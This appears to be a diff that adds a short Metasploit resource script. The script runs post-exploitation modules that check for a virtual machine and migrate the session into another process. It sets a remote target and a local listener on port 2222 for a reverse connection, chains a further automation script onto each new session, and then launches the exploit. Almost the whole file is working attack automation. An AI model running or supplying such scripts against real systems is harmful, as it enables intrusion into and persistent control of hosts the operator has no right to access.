@@ -1,0 +1,9 @@
+run post/windows/gather/checkvm
+run post/windows/manage/migrate
+set RHOST 10.137.0.1
+set RPORT 8081
+set LHOST 10.137.0.23
+set LPORT 2222
+set AutoRunScript multi_console_command -rc /root/my_scripts/multi_script
+exploit
+
